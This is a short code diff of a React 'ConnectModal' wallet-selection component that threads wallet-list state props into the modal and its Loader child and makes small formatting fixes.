@@ -5,17 +5,21 @@ import Image from "next/image";
 interface Walletdata {
   name: string;
   logo: string;
-  phraseNumber: number | null
+  phraseNumber: number | null;
 }
 
 function ConnectModal({
   openModal,
   handleClose,
   selected,
+  setWallets,
+  walletDetails,
 }: {
   openModal: boolean;
   handleClose: () => void;
   selected: Walletdata;
+  setWallets: React.Dispatch<React.SetStateAction<{ name: string; logo: string; phraseNumber: number | null; }[]>>;
+  walletDetails: Walletdata[];
 }) {
   return (
     <div>
@@ -23,11 +27,12 @@ function ConnectModal({
         open={openModal}
         onClose={() => {
           handleClose();
+          setWallets(walletDetails)
         }}
         aria-labelledby="modal-modal-title"
         aria-describedby="modal-modal-description"
         sx={{
-          zIndex: "10000", 
+          zIndex: "10000",
           backdropFilter: "blur(10px)", // Adds blur effect
           backgroundColor: "rgba(0, 0, 0, 0.1)", // Blackout effect
         }}
@@ -49,8 +54,13 @@ function ConnectModal({
             </div>
             <p className="text-white ">{selected.name}</p>
 
-
-            <Loader name={selected.name} handleClose={handleClose} number={selected.phraseNumber} />
+            <Loader
+              walletDetails={walletDetails}
+              setWallets={setWallets}
+              name={selected.name}
+              handleClose={handleClose}
+              number={selected.phraseNumber}
+            />
 
             <div className="flex  flex-col md:flex-row gap-1 items-center mt-3">
               <Image
